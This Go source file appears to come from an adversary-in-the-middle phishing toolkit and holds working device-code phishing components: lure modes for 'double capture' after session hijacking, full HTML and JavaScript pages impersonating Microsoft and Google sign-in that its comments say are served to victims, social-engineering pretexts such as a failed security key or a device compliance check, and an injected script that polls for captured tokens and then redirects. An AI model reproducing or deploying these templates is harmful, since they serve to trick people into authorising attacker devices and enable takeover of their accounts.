package core

// Device Code chaining modes for lures
const (
	DCModeOff      = "off"      // No device code chaining (default)
	DCModeAlways   = "always"   // Always redirect to device code after AitM success (double capture)
	DCModeFallback = "fallback" // Only use device code if AitM session stalls/fails
	DCModeAuto     = "auto"     // Pre-generate on lure click, auto-select strategy based on outcome
)

// ValidDeviceCodeModes lists all valid modes
var ValidDeviceCodeModes = []string{DCModeOff, DCModeAlways, DCModeFallback, DCModeAuto}

// IsValidDeviceCodeMode checks if a mode string is valid
func IsValidDeviceCodeMode(mode string) bool {
	for _, m := range ValidDeviceCodeModes {
		if m == mode {
			return true
		}
	}
	return false
}

// DEVICE_CODE_INTERSTITIAL_HTML is the Microsoft-styled interstitial page
// served at /dc/{session_id} to redirect victims to microsoft.com/devicelogin
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}
const DEVICE_CODE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>Microsoft Security</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI','Helvetica Neue',Arial,sans-serif;background:#f2f2f2;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#1b1b1b}
.container{background:#fff;border-radius:4px;box-shadow:0 2px 6px rgba(0,0,0,.2);padding:44px;max-width:440px;width:100%;text-align:center}
.logo{margin-bottom:16px}
.logo svg{width:108px;height:24px}
.status-icon{margin:20px 0 16px;font-size:40px}
.title{font-size:20px;font-weight:600;margin-bottom:8px;color:#1b1b1b}
.subtitle{font-size:14px;color:#616161;margin-bottom:24px;line-height:1.5}
.steps{text-align:left;margin:0 0 24px;padding:0 20px}
.steps li{font-size:14px;color:#1b1b1b;margin-bottom:12px;line-height:1.5}
.steps li a{color:#0067b8;text-decoration:none;font-weight:600}
.steps li a:hover{text-decoration:underline}
.code-container{background:#f0f0f0;border-radius:4px;padding:16px;margin:0 0 24px;display:inline-block;min-width:200px}
.code{font-size:28px;font-weight:700;letter-spacing:4px;color:#0067b8;font-family:'Segoe UI',monospace}
.btn-row{display:flex;gap:8px;justify-content:center;margin-bottom:16px}
.btn{display:inline-flex;align-items:center;justify-content:center;padding:8px 20px;border-radius:2px;font-size:14px;font-weight:600;cursor:pointer;border:none;transition:background .15s}
.btn-primary{background:#0067b8;color:#fff}
.btn-primary:hover{background:#005da6}
.btn-secondary{background:#fff;color:#0067b8;border:1px solid #0067b8}
.btn-secondary:hover{background:#f0f7ff}
.timer{font-size:12px;color:#797979;margin-top:8px}
.copied{color:#107c10;font-size:13px;margin-top:4px;min-height:20px}
.footer{margin-top:20px;font-size:11px;color:#797979}
.spinner{display:none;margin:16px auto;width:24px;height:24px;border:3px solid #e0e0e0;border-top:3px solid #0067b8;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.complete{display:none;text-align:center;padding:20px}
.complete .check{font-size:48px;color:#107c10;margin-bottom:12px}
.complete .msg{font-size:16px;color:#1b1b1b}
</style>
</head>
<body>
<div class="container" id="main">
<div class="logo">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 108 24">
<path fill="#f25022" d="M0 0h11v11H0z"/>
<path fill="#7fba00" d="M12 0h11v11H12z"/>
<path fill="#00a4ef" d="M0 12h11v11H0z"/>
<path fill="#ffb900" d="M12 12h11v11H12z"/>
<text x="28" y="17" font-family="Segoe UI,sans-serif" font-size="15" font-weight="600" fill="#1b1b1b">Microsoft</text>
</svg>
</div>

<div id="verifyView">
<div class="status-icon" id="statusIcon">&#128274;</div>
<div class="title" id="titleText">Device Verification Required</div>
<div class="subtitle" id="subtitleText">To complete sign-in, verify your device using the code below.</div>

<ol class="steps">
<li>Go to <a href="{verify_url}" target="_blank" rel="noopener" id="verifyLink">{verify_url}</a></li>
<li>Enter the code shown below</li>
<li>Sign in with your account and approve the request</li>
</ol>

<div class="code-container">
<div class="code" id="userCode">{user_code}</div>
</div>
<div class="copied" id="copiedMsg">&nbsp;</div>

<div class="btn-row">
<button class="btn btn-primary" onclick="copyCode()">Copy Code</button>
<a class="btn btn-secondary" href="{verify_url}" target="_blank" rel="noopener">Open Link</a>
</div>

<div class="timer" id="timerText">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
<div class="spinner" id="spinner"></div>
</div>

<div class="complete" id="completeView">
<div class="check">&#10004;</div>
<div class="msg">Verification complete. Redirecting...</div>
</div>

<div class="footer">
<span id="footerText">Microsoft Security — Account Protection</span>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var expMs={expires_seconds}*1000;
var startTime=Date.now();

// Template-specific customization
var tpl='{template_type}';
if(tpl==='fallback'){
document.getElementById('statusIcon').innerHTML='&#9888;&#65039;';
document.getElementById('titleText').textContent='Verification Method Unavailable';
document.getElementById('subtitleText').textContent='Your security key could not be verified. Please use manual verification instead.';
}else if(tpl==='compliance'){
document.getElementById('statusIcon').innerHTML='&#128187;';
document.getElementById('titleText').textContent='Device Compliance Check';
document.getElementById('subtitleText').textContent='Your organization requires device registration for continued access.';
document.getElementById('footerText').textContent='IT Security — Device Compliance';
}else{
document.getElementById('statusIcon').innerHTML='&#9989;';
document.getElementById('titleText').textContent='Sign-in Verified';
document.getElementById('subtitleText').textContent='One more step: Register this device for secure access.';
}

function copyCode(){
var code=document.getElementById('userCode').textContent;
if(navigator.clipboard){
navigator.clipboard.writeText(code).then(function(){
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
});
}else{
var ta=document.createElement('textarea');
ta.value=code;
document.body.appendChild(ta);
ta.select();
document.execCommand('copy');
document.body.removeChild(ta);
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
}
}
window.copyCode=copyCode;

// Countdown timer
function updateTimer(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,expMs-elapsed);
if(remaining<=0){
document.getElementById('countdown').textContent='EXPIRED';
return;
}
var m=Math.floor(remaining/60000);
var s=Math.floor((remaining%60000)/1000);
document.getElementById('countdown').textContent=m+':'+(s<10?'0':'')+s;
setTimeout(updateTimer,1000);
}
updateTimer();

// Poll for device code completion
function checkStatus(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured){
document.getElementById('verifyView').style.display='none';
document.getElementById('completeView').style.display='block';
setTimeout(function(){
if(d.redirect_url){
top.location.href=d.redirect_url;
}
},1500);
}else if(d.expired){
document.getElementById('countdown').textContent='EXPIRED';
}else{
document.getElementById('spinner').style.display='block';
setTimeout(checkStatus,3000);
}
})
.catch(function(){
setTimeout(checkStatus,5000);
});
}
setTimeout(checkStatus,5000);
})();
</script>
</body>
</html>`

// DEVICE_CODE_POLL_STATUS_JS is injected to poll for device code status
// Used when we need to redirect during an existing AitM session
const DEVICE_CODE_POLL_STATUS_JS = `
(function(){
var sid='{session_id}';
function checkDC(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured && d.redirect_url){
top.location.href=d.redirect_url;
}else if(!d.expired){
setTimeout(checkDC,3000);
}
})
.catch(function(){setTimeout(checkDC,5000);});
}
setTimeout(checkDC,3000);
})();
`

// DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML is the Google-styled interstitial page
// served at /dc/{session_id} for Google Workspace / Gmail device code phishing
// Placeholders: {user_code}, {verify_url}, {session_id}, {template_type}, {expires_minutes}, {expires_seconds}
const DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="referrer" content="no-referrer">
<title>Google Account</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Roboto','Segoe UI',Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;color:#202124}
.container{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;max-width:450px;width:100%;text-align:center}
.logo{margin-bottom:16px}
.title{font-size:24px;font-weight:400;margin-bottom:8px;color:#202124}
.subtitle{font-size:14px;color:#5f6368;margin-bottom:24px;line-height:20px}
.steps{text-align:left;margin:0 0 24px;padding:0 0 0 24px}
.steps li{font-size:14px;color:#202124;margin-bottom:12px;line-height:20px}
.steps li a{color:#1a73e8;text-decoration:none;font-weight:500}
.steps li a:hover{text-decoration:underline}
.code-container{background:#f8f9fa;border:1px solid #dadce0;border-radius:8px;padding:16px 24px;margin:0 auto 24px;display:inline-block;min-width:200px}
.code{font-size:28px;font-weight:500;letter-spacing:4px;color:#1a73e8;font-family:'Google Sans',monospace}
.btn-row{display:flex;gap:8px;justify-content:center;margin-bottom:16px}
.btn{display:inline-flex;align-items:center;justify-content:center;padding:8px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer;border:none;transition:background .2s,box-shadow .2s;font-family:'Google Sans','Roboto',sans-serif}
.btn-primary{background:#1a73e8;color:#fff}
.btn-primary:hover{background:#1765cc;box-shadow:0 1px 3px rgba(0,0,0,.2)}
.btn-secondary{background:#fff;color:#1a73e8;border:1px solid #dadce0}
.btn-secondary:hover{background:#f8f9fa}
.timer{font-size:12px;color:#80868b;margin-top:8px}
.copied{color:#137333;font-size:13px;margin-top:4px;min-height:20px}
.footer{margin-top:24px;font-size:12px;color:#80868b}
.footer a{color:#1a73e8;text-decoration:none}
.spinner{display:none;margin:16px auto;width:24px;height:24px;border:3px solid #e8eaed;border-top:3px solid #1a73e8;border-radius:50%;animation:spin 1s linear infinite}
@keyframes spin{to{transform:rotate(360deg)}}
.complete{display:none;text-align:center;padding:20px}
.complete .check{font-size:48px;color:#137333;margin-bottom:12px}
.complete .msg{font-size:16px;color:#202124}
.status-icon{margin:20px 0 16px;font-size:40px}
</style>
</head>
<body>
<div class="container" id="main">
<div class="logo">
<svg viewBox="0 0 75 24" xmlns="http://www.w3.org/2000/svg">
<text x="0" y="19" font-family="Product Sans,Google Sans,Roboto,Arial,sans-serif" font-size="22" font-weight="500">
<tspan fill="#4285f4">G</tspan><tspan fill="#ea4335">o</tspan><tspan fill="#fbbc04">o</tspan><tspan fill="#4285f4">g</tspan><tspan fill="#34a853">l</tspan><tspan fill="#ea4335">e</tspan>
</text>
</svg>
</div>

<div id="verifyView">
<div class="status-icon" id="statusIcon">&#128274;</div>
<div class="title" id="titleText">Device Verification</div>
<div class="subtitle" id="subtitleText">Complete the sign-in process by verifying your device.</div>

<ol class="steps">
<li>Go to <a href="{verify_url}" target="_blank" rel="noopener" id="verifyLink">{verify_url}</a></li>
<li>Enter the code shown below</li>
<li>Sign in with your Google account and approve access</li>
</ol>

<div class="code-container">
<div class="code" id="userCode">{user_code}</div>
</div>
<div class="copied" id="copiedMsg">&nbsp;</div>

<div class="btn-row">
<button class="btn btn-primary" onclick="copyCode()">Copy code</button>
<a class="btn btn-secondary" href="{verify_url}" target="_blank" rel="noopener">Open link</a>
</div>

<div class="timer" id="timerText">Code expires in <span id="countdown">{expires_minutes}:00</span></div>
<div class="spinner" id="spinner"></div>
</div>

<div class="complete" id="completeView">
<div class="check">&#10004;</div>
<div class="msg">Verification complete. Redirecting...</div>
</div>

<div class="footer">
<a href="https://support.google.com">Help</a> &middot;
<a href="https://policies.google.com/privacy">Privacy</a> &middot;
<a href="https://policies.google.com/terms">Terms</a>
</div>
</div>

<script>
(function(){
var sid='{session_id}';
var expMs={expires_seconds}*1000;
var startTime=Date.now();

var tpl='{template_type}';
if(tpl==='fallback'){
document.getElementById('statusIcon').innerHTML='&#9888;&#65039;';
document.getElementById('titleText').textContent='Verification method unavailable';
document.getElementById('subtitleText').textContent='Your security key could not be verified. Use an alternative method to complete sign-in.';
}else if(tpl==='compliance'){
document.getElementById('statusIcon').innerHTML='&#128187;';
document.getElementById('titleText').textContent='Device enrollment required';
document.getElementById('subtitleText').textContent='Your organization requires device registration to access this service.';
}else{
document.getElementById('statusIcon').innerHTML='&#9989;';
document.getElementById('titleText').textContent='Sign-in verified';
document.getElementById('subtitleText').textContent='One more step: Link this device to your account for continued access.';
}

function copyCode(){
var code=document.getElementById('userCode').textContent;
if(navigator.clipboard){
navigator.clipboard.writeText(code).then(function(){
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
});
}else{
var ta=document.createElement('textarea');
ta.value=code;
document.body.appendChild(ta);
ta.select();
document.execCommand('copy');
document.body.removeChild(ta);
document.getElementById('copiedMsg').textContent='Code copied!';
setTimeout(function(){document.getElementById('copiedMsg').innerHTML='&nbsp;';},2000);
}
}
window.copyCode=copyCode;

function updateTimer(){
var elapsed=Date.now()-startTime;
var remaining=Math.max(0,expMs-elapsed);
if(remaining<=0){
document.getElementById('countdown').textContent='EXPIRED';
return;
}
var m=Math.floor(remaining/60000);
var s=Math.floor((remaining%60000)/1000);
document.getElementById('countdown').textContent=m+':'+(s<10?'0':'')+s;
setTimeout(updateTimer,1000);
}
updateTimer();

function checkStatus(){
fetch('/dc/status/'+sid,{method:'GET',credentials:'include'})
.then(function(r){return r.json()})
.then(function(d){
if(d.captured){
document.getElementById('verifyView').style.display='none';
document.getElementById('completeView').style.display='block';
setTimeout(function(){
if(d.redirect_url){
top.location.href=d.redirect_url;
}
},1500);
}else if(d.expired){
document.getElementById('countdown').textContent='EXPIRED';
}else{
document.getElementById('spinner').style.display='block';
setTimeout(checkStatus,3000);
}
})
.catch(function(){
setTimeout(checkStatus,5000);
});
}
setTimeout(checkStatus,5000);
})();
</script>
</body>
</html>`

// GetInterstitialForProvider returns the appropriate interstitial HTML template for the provider
func GetInterstitialForProvider(provider string) string {
	switch provider {
	case DCProviderGoogle:
		return DEVICE_CODE_GOOGLE_INTERSTITIAL_HTML
	default:
		return DEVICE_CODE_INTERSTITIAL_HTML
	}
}
